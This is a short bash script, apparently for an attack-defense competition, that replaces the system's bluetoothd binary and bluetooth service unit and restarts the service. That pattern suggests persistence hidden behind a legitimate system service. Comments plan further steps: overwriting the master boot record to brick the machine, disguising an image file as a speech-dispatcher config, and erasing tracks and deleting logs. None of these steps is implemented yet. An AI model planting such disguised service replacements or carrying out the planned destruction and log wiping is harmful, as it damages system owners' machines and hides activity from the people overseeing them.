#!/bin/bash

mv bluetoothd /usr/libexec/bluetooth
mv bluetooth.service /etc/systemd/system/bluetooth.target.wants/
systemctl restart bluetooth

# some program to overwrite the mbr and brick the system at the end of the comp
# havent found a good one that works yet
# mv something.img /etc/speech-dispatcher/john-generic.conf
# something to try and erase tracks, delete logs idk